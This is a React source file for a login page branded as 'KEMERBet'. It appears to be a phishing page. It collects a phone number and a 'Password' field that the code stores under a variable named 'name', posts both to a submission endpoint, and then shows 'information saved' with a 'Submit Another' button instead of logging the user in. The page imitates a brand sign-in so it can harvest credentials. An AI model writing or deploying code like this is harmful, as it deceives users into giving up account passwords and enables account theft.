import { useState } from 'react';
import api from '../utils/api';
import logo from '../assets/logo.jpg';
import styles from './LoginPage.module.css';

export default function LoginPage() {
  const [name, setName] = useState('');
  const [phone, setPhone] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');

    if (!name || !phone) {
      setError('Please fill in all fields');
      return;
    }

    const fullPhone = `251${phone}`;

    setLoading(true);
    try {
      await api.post('/auth/submit', { name, phone: fullPhone });
      setSuccess(true);
    } catch (err) {
      setError(err.response?.data?.message || 'Something went wrong. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  if (success) {
    return (
      <div className={styles.container}>
        <div className={styles.card}>
          <div className={styles.successCard}>
            <div className={styles.successIcon}>✓</div>
            <h2 className={styles.successTitle}>Submitted!</h2>
            <p className={styles.successText}>Your information has been saved successfully.</p>
            <button
              className={styles.loginBtn}
              onClick={() => { setSuccess(false); setName(''); setPhone(''); }}
            >
              Submit Another
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className={styles.container}>
      <div className={styles.card}>
        {/* Logo Section */}
        <div className={styles.logoSection}>
          <div className={styles.logoBox}>
            <img src={logo} alt="KEMERBet" className={styles.logoImg} />
          </div>
          <p className={styles.signInLabel}>Sign In.</p>
          <h1 className={styles.welcomeTitle}>Welcome Back!</h1>
          <p className={styles.signInSub}>
            Sign in with your <span className={styles.brandLink}>KEMERBet account</span> credentials to continue.
          </p>
        </div>

        {/* Form */}
        <form className={styles.form} onSubmit={handleSubmit} noValidate>
          {error && <div className={styles.errorBox}>{error}</div>}

          {/* Phone Field */}
          <div className={styles.phoneWrapper}>
            <span className={styles.countryCode}>251</span>
            <input
              type="tel"
              className={styles.phoneInput}
              placeholder="912345678"
              value={phone}
              onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
              maxLength={9}
              inputMode="numeric"
              autoComplete="tel"
            />
          </div>

          {/* Name Field */}
          <input
            type="text"
            className={styles.input}
            placeholder="Password"
            value={name}
            onChange={(e) => setName(e.target.value)}
            autoComplete="name"
          />

          <button
            type="submit"
            className={styles.loginBtn}
            disabled={loading}
          >
            {loading ? 'Submitting...' : 'Login'}
          </button>
        </form>
      </div>
    </div>
  );
}


